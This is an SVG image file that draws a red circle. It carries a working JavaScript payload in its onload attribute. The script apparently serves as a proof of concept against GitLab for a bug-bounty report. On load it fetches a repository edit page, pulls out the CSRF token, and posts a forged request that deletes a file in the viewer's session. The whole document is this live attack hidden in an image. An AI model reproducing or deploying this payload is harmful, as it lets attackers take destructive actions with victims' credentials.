<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
	onload="fetch('https://gitlab.com/skewbed/xss-test-hackerone/edit').then(function(b){return b.text()}).then(function(b){quote=String.fromCharCode(34),openCaret=String.fromCharCode(60),closeCaret=String.fromCharCode(62),token=b.split(openCaret+'meta name='+quote+'csrf-token'+quote+' content='+quote)[1].split(quote)[0],url='https://gitlab.com/skewbed/xss-test-hackerone/-/blob/master/important',data={utf8:'\u2713',_method:'delete',authenticity_token:token,branch_name:'master',create_merge_request:'1',original_branch:'master',commit_message:'Delete important'};const a=new XMLHttpRequest,c=new FormData;for(name in data)c.append(name,data[name]);a.addEventListener('load',function(){console.log('it worked')}),a.addEventListener('error',function(){console.log('it didnt work')}),a.open('POST',url),a.send(c)});"
    width="100" height="100"
>
  <circle cx="50" cy="50" r="50" fill="red" />
</svg>
